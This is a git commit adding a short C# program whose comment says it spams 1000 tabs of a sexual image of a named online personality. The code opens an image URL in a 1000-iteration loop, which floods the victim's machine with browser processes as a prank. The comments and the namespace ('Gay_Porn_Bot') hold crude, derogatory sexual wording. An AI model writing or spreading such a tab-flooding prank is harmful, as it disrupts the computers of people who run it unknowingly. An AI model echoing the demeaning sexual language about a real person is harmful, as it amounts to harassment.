a38bc9f5edcdd5f5238f9bcad4b6ea2959392a3a
vivafalastina <liluzix@gmail.com>
2021-04-26 15:36:22 -0400

    Changed URL

---
+++ Program.cs
@@ -0,0 +1,25 @@
+﻿//Marry Juana
+//2021-04-26
+//Spams 1000 tabs of edp's dick pic
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Diagnostics;
+
+namespace Gay_Porn_Bot
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            string target = "https://i.ytimg.com/vi/3E-bPeFj42w/maxresdefault.jpg";
+
+            for(int i = 0; i < 1000; i++)
+            {
+                System.Diagnostics.Process.Start(target);
+            }
+        }
+    }
+}
